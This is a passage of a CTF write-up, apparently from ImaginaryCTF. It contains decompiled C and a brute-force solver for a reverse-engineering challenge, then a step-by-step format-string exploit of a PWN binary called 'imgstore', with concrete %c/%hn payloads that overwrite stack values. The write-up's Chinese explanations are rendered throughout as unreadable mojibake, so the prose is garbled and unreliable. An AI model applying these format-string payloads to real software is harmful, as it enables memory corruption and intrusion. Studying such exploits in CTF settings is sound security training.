class="string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">iterate</span><span class="params">(<span class="type">int</span> a1)</span>; <span class="comment">// idb</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span>;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">18</span>] = <span class="string">&quot;nothing_here_lmao&quot;</span>; <span class="comment">// weak</span></span><br><span class="line">_BYTE table1[<span class="number">6</span>] = &#123; <span class="number">82</span>, <span class="number">100</span>, <span class="number">113</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">118</span> &#125;; <span class="comment">// weak</span></span><br><span class="line">_BYTE table2[<span class="number">6</span>] = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span> &#125;; <span class="comment">// weak</span></span><br><span class="line"><span class="type">char</span> completed_0; <span class="comment">// weak</span></span><br><span class="line"><span class="type">int</span> counter1; <span class="comment">// weak</span></span><br><span class="line"><span class="type">int</span> counter2; <span class="comment">// weak</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//----- (0000000000001149) ----------------------------------------------------</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">iterate</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+1Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  v3 = flag[a1];</span><br><span class="line">  v4 = (a1 &amp; <span class="number">1</span>) != <span class="number">0</span>;</span><br><span class="line">  v1 = v3 &gt; <span class="number">0x60</span>u &amp;&amp; v3 &lt;= <span class="number">0x7A</span>u;</span><br><span class="line">  flag[a1] = ((((<span class="type">int</span>)v3 &gt;&gt; table2[counter2]) | (v3 &lt;&lt; (<span class="number">8</span> - table2[counter2]))) * v1</span><br><span class="line">            + !v1 * (((v3 &lt;&lt; <span class="number">6</span>) | (v3 &gt;&gt; <span class="number">2</span>)) ^ table1[counter1]))</span><br><span class="line">           * ((a1 &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">           + ((v3 ^ table1[counter1]) * v1 + !v1 * ((<span class="number">4</span> * v3) | (v3 &gt;&gt; <span class="number">6</span>))) * ((a1 &amp; <span class="number">1</span>) != <span class="number">0</span>);</span><br><span class="line">  counter1 = (v4 + counter1) % <span class="number">6</span>;</span><br><span class="line">  counter2 = (v4 + counter2) % <span class="number">6</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%02x,&quot;</span>, (<span class="type">unsigned</span> __int8)flag[a1]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(a1 + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- (0000000000001343) ----------------------------------------------------</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = iterate(<span class="number">0</span>);</span><br><span class="line">  v4 = iterate(v3);</span><br><span class="line">  v5 = iterate(v4);</span><br><span class="line">  v6 = iterate(v5);</span><br><span class="line">  v7 = iterate(v6);</span><br><span class="line">  v8 = iterate(v7);</span><br><span class="line">  v9 = iterate(v8);</span><br><span class="line">  v10 = iterate(v9);</span><br><span class="line">  v11 = iterate(v10);</span><br><span class="line">  v12 = iterate(v11);</span><br><span class="line">  v13 = iterate(v12);</span><br><span class="line">  v14 = iterate(v13);</span><br><span class="line">  v15 = iterate(v14);</span><br><span class="line">  v16 = iterate(v15);</span><br><span class="line">  v17 = iterate(v16);</span><br><span class="line">  v18 = iterate(v17);</span><br><span class="line">  v19 = iterate(v18);</span><br><span class="line">  v20 = iterate(v19);</span><br><span class="line">  v21 = iterate(v20);</span><br><span class="line">  v22 = iterate(v21);</span><br><span class="line">  v23 = iterate(v22);</span><br><span class="line">  v24 = iterate(v23);</span><br><span class="line">  v25 = iterate(v24);</span><br><span class="line">  v26 = iterate(v25);</span><br><span class="line">  v27 = iterate(v26);</span><br><span class="line">  v28 = iterate(v27);</span><br><span class="line">  v29 = iterate(v28);</span><br><span class="line">  v30 = iterate(v29);</span><br><span class="line">  v31 = iterate(v30);</span><br><span class="line">  v32 = iterate(v31);</span><br><span class="line">  v33 = iterate(v32);</span><br><span class="line">  v34 = iterate(v33);</span><br><span class="line">  iterate(v34);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>ç„¶å¾ŒæŠŠflagé‚£é‚Šçš„å‰äº”å€‹å­—æ”¹æˆ<code>ictf&#123;</code>outputçš„å‰äº”å€‹å­—å°±æœƒè·Ÿç­”æ¡ˆç›¸åŒï¼Œåˆ©ç”¨é€™é»å¯ä»¥åšçˆ†æœ<br>æˆ‘å¯«çš„çˆ›code</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;edited.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">iterate</span><span class="params">(<span class="type">int</span> a1)</span>; <span class="comment">// idb</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// Data declarations</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> flag[<span class="number">10000000</span>]; <span class="comment">// weak</span></span><br><span class="line"></span><br><span class="line">_BYTE table1[<span class="number">6</span>] = &#123;<span class="number">82</span>, <span class="number">100</span>, <span class="number">113</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">118</span>&#125;; <span class="comment">// weak</span></span><br><span class="line">_BYTE table2[<span class="number">6</span>] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;          <span class="comment">// weak</span></span><br><span class="line"><span class="type">int</span> counter1 = <span class="number">0</span>;                              <span class="comment">// weak</span></span><br><span class="line"><span class="type">int</span> counter2 = <span class="number">0</span>;                              <span class="comment">// weak</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">33</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- (0000000000001149) ----------------------------------------------------</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">iterate</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v3 = flag[a1];</span><br><span class="line">    <span class="type">bool</span> v4 = (a1 &amp; <span class="number">1</span>) != <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> v1 = v3 &gt; <span class="number">0x60</span>u &amp;&amp; v3 &lt;= <span class="number">0x7A</span>u;</span><br><span class="line">    flag[a1] = ((((<span class="type">int</span>)v3 &gt;&gt; table2[counter2]) | (v3 &lt;&lt; (<span class="number">8</span> - table2[counter2]))) * v1 + !v1 * (((v3 &lt;&lt; <span class="number">6</span>) | (v3 &gt;&gt; <span class="number">2</span>)) ^ table1[counter1])) * ((a1 &amp; <span class="number">1</span>) == <span class="number">0</span>) + ((v3 ^ table1[counter1]) * v1 + !v1 * ((<span class="number">4</span> * v3) | (v3 &gt;&gt; <span class="number">6</span>))) * ((a1 &amp; <span class="number">1</span>) != <span class="number">0</span>);</span><br><span class="line">    counter1 = (v4 + counter1) % <span class="number">6</span>;</span><br><span class="line">    counter2 = (v4 + counter2) % <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>)flag[a1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">it</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp[i] = iterate(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_result</span><span class="params">()</span> <span class="comment">//åˆå§‹åŒ–é€™äº›å€¼ï¼Œä¸‹ä¸€æ¬¡çš„å˜—è©¦æ‰æœƒæ˜¯æ­£ç¢ºçš„çµæœ</span></span><br><span class="line">&#123;</span><br><span class="line">    table1[<span class="number">0</span>] = <span class="number">82</span>;</span><br><span class="line">    table1[<span class="number">1</span>] = <span class="number">100</span>;</span><br><span class="line">    table1[<span class="number">2</span>] = <span class="number">113</span>;</span><br><span class="line">    table1[<span class="number">3</span>] = <span class="number">81</span>;</span><br><span class="line">    table1[<span class="number">4</span>] = <span class="number">84</span>;</span><br><span class="line">    table1[<span class="number">5</span>] = <span class="number">118</span>;</span><br><span class="line"></span><br><span class="line">    table2[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    table2[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">    table2[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">    table2[<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line">    table2[<span class="number">4</span>] = <span class="number">6</span>;</span><br><span class="line">    table2[<span class="number">5</span>] = <span class="number">5</span>;</span><br><span class="line">    counter2 = <span class="number">0</span>;</span><br><span class="line">    counter1 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//----- (0000000000001343) ----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">33</span>] = &#123;<span class="number">0xb4</span>, <span class="number">0x31</span>, <span class="number">0x8e</span>, <span class="number">0x02</span>, <span class="number">0xaf</span>, <span class="number">0x1c</span>, <span class="number">0x5d</span>, <span class="number">0x23</span>, <span class="number">0x98</span>, <span class="number">0x7d</span>, <span class="number">0xa3</span>, <span class="number">0x1e</span>, <span class="number">0xb0</span>, <span class="number">0x3c</span>, <span class="number">0xb3</span>, <span class="number">0xc4</span>, <span class="number">0xa6</span>, <span class="number">0x06</span>, <span class="number">0x58</span>, <span class="number">0x28</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xa3</span>, <span class="number">0xc0</span>, <span class="number">0x85</span>, <span class="number">0x31</span>, <span class="number">0x68</span>, <span class="number">0x0a</span>, <span class="number">0xbc</span>, <span class="number">0x03</span>, <span class="number">0x5d</span>, <span class="number">0x0b</span>&#125;;</span><br><span class="line">    <span class="type">char</span> tempflag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="string">&#x27; &#x27;</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            tempflag[i] = j;</span><br><span class="line">            <span class="built_in">strcpy</span>(flag, tempflag);</span><br><span class="line">            clear_result();</span><br><span class="line">            it();</span><br><span class="line">            <span class="keyword">if</span> (temp[i] == ans[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>result:<br><img src="https://hackmd.io/_uploads/rJViTfAuC.png" alt="image"></p>
<p>æœ‰äº›ä½ç½®å±…ç„¶æœ‰å…©å€‹è§£(!?<br>ä½†ä½ å¯ä»¥é€éçŒœæ¸¬å»çŒœå‡ºæœ‰åˆ†å²”çš„å­—<br>ictf{m0r3_than_1_way5_t0_c0n7r0??<br>(å¾Œå…©å€‹å€‹å­—å…ƒæœ‰é»æ€ªæ€ªçš„ï¼Œæ‰€ä»¥æˆ‘æ”¾å•è™Ÿ)</p>
<p>ç„¶å¾Œæˆ‘æŠŠåŸæœ¬çš„chalçš„å½c code<br>æ”¹æˆå¯ä»¥é€éè¼¸å…¥ä¾†é¡¯ç¤ºè¼¸å‡ºçµæœçš„code</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">iterate</span><span class="params">(<span class="type">int</span> a1)</span>; <span class="comment">// idb</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> flag[<span class="number">34</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">// weak</span></span><br><span class="line">_BYTE table1[<span class="number">6</span>] = &#123; <span class="number">82</span>, <span class="number">100</span>, <span class="number">113</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">118</span> &#125;; <span class="comment">// weak</span></span><br><span class="line">_BYTE table2[<span class="number">6</span>] = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span> &#125;; <span class="comment">// weak</span></span><br><span class="line"><span class="type">char</span> completed_0; <span class="comment">// weak</span></span><br><span class="line"><span class="type">int</span> counter1; <span class="comment">// weak</span></span><br><span class="line"><span class="type">int</span> counter2; <span class="comment">// weak</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">iterate</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+1Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  v3 = flag[a1];</span><br><span class="line">  v4 = (a1 &amp; <span class="number">1</span>) != <span class="number">0</span>;</span><br><span class="line">  v1 = v3 &gt; <span class="number">0x60</span>u &amp;&amp; v3 &lt;= <span class="number">0x7A</span>u;</span><br><span class="line">  flag[a1] = ((((<span class="type">int</span>)v3 &gt;&gt; table2[counter2]) | (v3 &lt;&lt; (<span class="number">8</span> - table2[counter2]))) * v1</span><br><span class="line">            + !v1 * (((v3 &lt;&lt; <span class="number">6</span>) | (v3 &gt;&gt; <span class="number">2</span>)) ^ table1[counter1]))</span><br><span class="line">           * ((a1 &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">           + ((v3 ^ table1[counter1]) * v1 + !v1 * ((<span class="number">4</span> * v3) | (v3 &gt;&gt; <span class="number">6</span>))) * ((a1 &amp; <span class="number">1</span>) != <span class="number">0</span>);</span><br><span class="line">  counter1 = (v4 + counter1) % <span class="number">6</span>;</span><br><span class="line">  counter2 = (v4 + counter2) % <span class="number">6</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%02x,&quot;</span>, (<span class="type">unsigned</span> __int8)flag[a1]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(a1 + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//----- (0000000000001343) ----------------------------------------------------</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    fgets(flag, <span class="keyword">sizeof</span>(flag), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">        iterate(i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹ä¾†çŒœæœ€å¾Œå…©å€‹å­—ï¼Œæœ€å¾Œä¸€å€‹åŸºæœ¬ä¸Šå¯ä»¥ç¢ºå®šæ˜¯<code>&#125;</code>äº†<br>çŒœå€’æ•¸ç¬¬äºŒå€‹å­—æ˜¯lï¼Œå› ç‚º<code>c0n7r0l</code>å¾ˆåƒ<code>control</code><br><img src="https://hackmd.io/_uploads/HkjnkmROA.png" alt="image"><br>flag get!!</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><ul>
<li>solver hokak</li>
</ul>
<h3 id="imgstore"><a href="#imgstore" class="headerlink" title="imgstore"></a>imgstore</h3><p>ç¨‹å¼ä¸€é–‹å§‹æœƒçµ¦ä½ ä¸‰å€‹é¸é …<br><img src="https://hackmd.io/_uploads/HkYIqlA_A.png" alt="image"></p>
<p>å…¶ä»–å…©å€‹é¸é …æ²’ç”¨ï¼Œå¦‚æœé¸3çš„è©±å¯ä»¥å°±å¯ä»¥é€²å…¥ä¸€å€‹æœ‰format string bugçš„function<br>å¯ä»¥å…ˆleakå‡ºrsp+8ã€rsp+<br>è€Œé€™é‚Šå¯ä»¥çœ‹åˆ°<code>buf * 334873123 == dword_6050(é€™å€‹å€¼æ˜¯0xfeedbeef)</code>çš„åˆ¤æ–·å¼<br>ç„¶å¾Œbufæ˜¯éš¨æ©Ÿå€¼<br>é€šéé€™å€‹åˆ¤æ–·å¼å°±å¯ä»¥æˆåŠŸé€²å…¥ä¸€å€‹æœƒæœ‰bofçš„function<br><img src="https://hackmd.io/_uploads/SJf-5lRu0.png" alt="image"><br>è€Œå…©é‚Šçš„æ•¸æ²’æœ‰å€æ•¸é—œä¿‚ï¼Œæ‰€ä»¥æˆ‘å€‘ä¸èƒ½åªç”¨å–®ç´”çš„é™¤æ³•å»ç®—<br>å¿…é ˆåˆ©ç”¨ç®—æ•¸æº¢ä½çš„æŠ€å·§ï¼Œå¯ä»¥æŠŠä»–æƒ³æˆ(mod 0x100000000)<br>æ‰€ä»¥åˆ©ç”¨æ¨¡åå…ƒç´ å¯ä»¥ç®—å‡ºé€™å€‹å€¼<br>$\texttt{n &#x3D; 0x100000000, a &#x3D; 334873123, x &#x3D; 0xfeedbeef}$<br>$\texttt{inv(n, a)} &#x3D; a^{-1}$<br>$\texttt{buf} &#x3D; a^{-1} * \texttt{x} &#x3D; \texttt{0x8c87dec5} (\mod {n})$</p>
<p>ç„¶å¾Œå¯ä»¥çœ‹ä¸€ä¸‹stack<br><img src="https://hackmd.io/_uploads/BkHd5bRd0.png" alt="image"><br>rsp+8æ˜¯buf<br>(rsp+48)æ˜¯ä¸€å€‹å­˜(rsp+80)çš„ä½å€ï¼Œ(rsp+80)æ˜¯å­˜(rsp+90)çš„å€¼<br>é¦–å…ˆå…ˆç”¨rsp+48æ¨ç®—rsp+8çš„ä½å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rsp+8 = 0x300001445(random)</span><br><span class="line">rsp+48 = rsp+80 -&gt; rsp+90 -&gt; 0</span><br><span class="line">rsp+80 = rsp+90 -&gt; 0</span><br><span class="line">rsp+90 = 0</span><br></pre></td></tr></table></figure>
<p>ç„¶å¾Œåˆ©ç”¨format stringæ”¹è®Š(rsp+48)æ‰€æŒ‡å‘çš„å€¼(rsp+80)ï¼Œè®“ä»–æŒ‡å‘(rsp+8)<br>æ”¹å¾Œé¢2byteså³å¯ï¼Œç„¶å¾Œå°±å¯ä»¥çœ‹åˆ°(rsp+80)æ‰€æŒ‡å‘çš„å€¼è®Šæˆ(rsp+8)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload : printf(%(rsp + 8)c%15$hn)</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹å¾Œ:</span><br><span class="line">rsp+8 = 0x300001445(random)</span><br><span class="line">rsp+48 = rsp+80 -&gt; rsp+8 -&gt; 0x300001445(random)</span><br><span class="line">rsp+80 = rsp+8 -&gt; 0x300001445(random)</span><br></pre></td></tr></table></figure>

<p>ç„¶å¾Œå°±å¯ä»¥åˆ©ç”¨rsp+80å»ä¿®æ”¹rsp+8çš„å€¼äº†(ä¸€æ¬¡æ”¹2bytesï¼Œ4bytesé‡å¤ªå¤§)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload : printf(%57029c%22$hn)</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹å¾Œ:</span><br><span class="line">rsp+8 = 0x30000dec5</span><br></pre></td></tr></table></figure>

<p>æ¥è‘—åˆ©ç”¨rsp+48æŠŠrsp+80æ”¹æˆrsp+a</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload : printf(%(rsp + a)c%15$hn)</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹å¾Œ:</span><br><span class="line">rsp+a = 0x30000</span><br><span class="line">rsp+48 = rsp+80 -&gt; rsp+a -&gt; 0x30000</span><br><span class="line">rsp+80 = rsp+a -&gt; 0x30000</span><br></pre></td></tr></table></figure>
<p>ç„¶å¾Œå°±å¯ä»¥åˆ©ç”¨rsp+80å»ä¿®æ”¹rsp+açš„å€¼äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload : printf(%35975c%22$hn)</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹å¾Œ:</span><br><span class="line">rsp+a = 0x38c87</span><br><span class="line">rsp+8 = 0x38c87dec5</span><br><span class="line">ä½†æˆ‘å€‘ä¸ç®¡æœ€å‰é¢é‚£å€‹3ï¼Œå› ç‚ºbufæ˜¯int32ï¼Œ3ä¸åœ¨ç¯„åœå…§</span><br></pre></td></tr></table></figure>

